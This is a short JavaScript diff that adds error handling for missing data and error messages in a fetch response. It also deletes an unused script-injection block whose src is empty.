@@ -7,13 +7,23 @@
             .then(r => r.json())
             .then(r => {
 
+                if (r.data) {
                     if (r.data.status === 'error') {
                         const msg = r.data.tasks.filter(t => t.status === "error").reduce((acc, cur) => acc += cur.message + '\n', '');
                         log(msg, 0);
                         return null;
                     }
                     return r.data;
-                
+                } else if (r.message) {
+                    let msg = r.message;
+
+                    if (r.errors) {
+                        msg += `: ${r.errors.tasks.join(' ')}`;
+                    }
+                    log(msg, 0);
+                    return null;
+                }
+                return null;
             })
             .catch(e => {
                 log(e.message, 0);
@@ -169,11 +179,7 @@
     };
 })();
 
-(() => {
-    const script = document.createElement('script');
-    script.src = ``;
-    document.head.appendChild(script);
-})();
+
 
 
 
